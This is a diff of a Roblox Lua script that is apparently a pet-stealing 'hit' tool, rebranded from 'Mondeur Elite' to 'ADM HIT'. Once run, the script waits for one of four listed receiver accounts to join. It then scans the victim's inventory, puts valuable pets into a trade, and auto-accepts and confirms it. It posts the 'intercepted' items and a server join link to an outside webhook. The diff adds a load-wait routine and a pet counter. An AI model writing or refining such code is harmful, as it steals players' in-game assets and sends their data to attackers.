@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE | VANTA V3 FIXED ]] --
+-- [[ ADM HIT (BETA) | STABLE V4 ]] --
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -10,6 +10,16 @@ local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
 
 local PetValues = {}
+
+--------------------------------------------------------------
+-- LOADING PROTECTOR (Fixes Loading Screen Errors)
+--------------------------------------------------------------
+local function wait_for_game()
+    repeat task.wait(1) until game:IsLoaded()
+    repeat task.wait(1) until ReplicatedStorage:FindFirstChild("API")
+    print("✅ Game and API Fully Loaded. Starting Script...")
+end
+wait_for_game()
 
 -- [[ LOAD POINT SYSTEM ]] --
 local function loadPoints()
@@ -25,8 +35,10 @@ local function loadPoints()
 end
 loadPoints()
 
--- [[ THE "ELITE" UI DESIGN ]] --
-local function sendMondeurWebhook(pets, total, isHandshake)
+--------------------------------------------------------------
+-- THE REDESIGNED UI (ADM HIT BETA)
+--------------------------------------------------------------
+local function sendADMWebhook(pets, total, totalCount, isHandshake)
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if not request then return end
 
@@ -40,8 +52,8 @@ local function sendMondeurWebhook(pets, total, isHandshake)
     end
 
     local payload = {
-        username = "Mondeur Intelligence",
-        avatar_url = "https://cdn.discordapp.com/embed/avatars/4.png", 
+        username = "ADM HIT (BETA)",
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/2.png", 
         embeds = {{
             title = isHandshake and "🛰️ SYSTEM: SESSION INITIALIZED" or "🎯 TARGET: ITEMS INTERCEPTED",
             description = "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
@@ -54,11 +66,12 @@ local function sendMondeurWebhook(pets, total, isHandshake)
                 "💰 **TOTAL VALUE:** `" .. (isHandshake and "0.00" or total) .. "`\n\n" ..
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
                 "🔍 **SCRAP SUMMARY**\n" ..
+                "• **Total Pets Found:** `" .. (totalCount or "0") .. "`\n" ..
                 "[View Raw Data](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
                 "🔗 **QUICK JOIN**\n" ..
                 "[Click to Join Server](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
-            color = isHandshake and 0x5865F2 or 0xFEE75C,
-            footer = { text = "Mondeur Hit | " .. os.date("%X") }
+            color = isHandshake and 0x5865F2 or 0xEB459E, -- Blurple or Pink
+            footer = { text = "ADM Services Beta | " .. os.date("%X") }
         }}
     }
 
@@ -72,7 +85,9 @@ local function sendMondeurWebhook(pets, total, isHandshake)
     end)
 end
 
--- [[ CORE LOGIC ]] --
+--------------------------------------------------------------
+-- CORE LOGIC
+--------------------------------------------------------------
 local function execute()
     local receiver = nil
     for _, name in ipairs(TARGET_RECEIVERS) do
@@ -80,12 +95,13 @@ local function execute()
     end
     if not receiver then return end
 
-    local list, total = {}, 0
+    local list, total, totalCount = {}, 0, 0
     local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
     
     if success and inv then
         for _, item in ipairs(inv) do
             if item.Kind == "Pet" then
+                totalCount = totalCount + 1
                 local cleanName = item.Name:lower():gsub("%s+", "")
                 for pointName, val in pairs(PetValues) do
                     if string.find(cleanName, pointName) then
@@ -104,15 +120,15 @@ local function execute()
         for _, p in ipairs(list) do TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
         TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
         TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
-        sendMondeurWebhook(list, total, false)
+        sendADMWebhook(list, total, totalCount, false)
     end
 end
 
 -- [[ START ]] --
-sendMondeurWebhook({}, 0, true)
+sendADMWebhook({}, 0, 0, true)
 task.spawn(function()
     while true do
         pcall(execute)
-        task.wait(1)
+        task.wait(1.5) -- Slightly slower loop for better stability
     end
 end)
